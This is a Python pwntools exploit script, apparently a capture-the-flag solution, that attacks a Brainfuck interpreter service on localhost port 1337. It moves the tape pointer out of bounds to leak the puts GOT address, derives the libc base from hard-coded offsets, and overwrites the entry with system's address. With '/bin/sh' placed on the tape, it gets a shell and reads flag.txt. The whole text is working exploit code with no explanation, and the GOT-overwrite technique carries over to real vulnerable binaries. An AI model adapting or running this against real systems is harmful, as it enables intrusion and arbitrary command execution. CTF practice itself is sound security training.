from pwn import *

p = remote("localhost", 1337)

def recv(n=8):
    data = b""
    while len(data) < n:
        data += p.recvn(n - len(data))
    return data

brainfuck = b"<" * 88 # Move 88 back (puts GOT)
brainfuck += b".>" * 8 # Print puts GOT address
brainfuck += b"<" * 8 # Move back to the start of the address
brainfuck += b",>" * 8 # Read the address from input
brainfuck += b">" * 88 # Move back to the start of the tape
p.sendline(brainfuck)

tape = b"/bin/sh\x00"  # Initial tape content
p.sendline(tape)

p.recvline()
p.recvline()
p.recvline()

puts_got = u64(recv(8))
print(f"puts GOT: {hex(puts_got)}")

# libc_base = puts_got - 0x81da0 # local
libc_base = puts_got - 0x87be0
print(f"libc base: {hex(libc_base)}")

# system_got = libc_base + 0x53400 # local
system_got = libc_base + 0x58750
print(f"system GOT: {hex(system_got)}")

p.sendline(p64(system_got))

p.sendline(b"cat flag.txt")
p.interactive()
